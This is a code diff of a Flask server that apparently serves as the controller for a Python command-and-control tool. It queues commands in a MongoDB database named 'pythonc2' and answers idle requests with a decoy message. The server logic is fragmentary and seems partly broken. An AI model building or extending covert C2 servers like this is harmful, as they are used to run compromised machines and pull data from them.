@@ -1,21 +1,27 @@
 from flask import Flask,request
 from pathlib import Path
 import  os
+import pymongo
 
-def main():
+def main(myclient):
     app = Flask('app')
 
     @app.route('/',methods = ['GET', 'POST'])
     def run():
         if request.method == 'GET':
-            my_file = Path("./commands.txt")
-            if my_file.is_file():
-                f = open(my_file,'r')
-                commands = f.read()
-                f.close()
-                os.remove(my_file)
+            mydb = myclient["pythonc2"]
+            mycol = mydb["commands"]
+            x = mycol.find_one()
+            if 'sample' in x:
+                mycol.delete_one(x)
+                x = mycol.find_one()
 
+            if 'command' in x:
+                cmd = x['command']
+                mycol.delete_one(x)
                 return "Exfiltration command detected"
+
+                
             return 'Nothing Fishy going on here :)'
         if request.method == 'POST':
             # data = request.json
@@ -38,4 +44,5 @@ def main():
 
 
 if __name__=="__main__":
-    main()
+    myclient = pymongo.MongoClient("mongodb://localhost:27017/")
+    main(myclient)
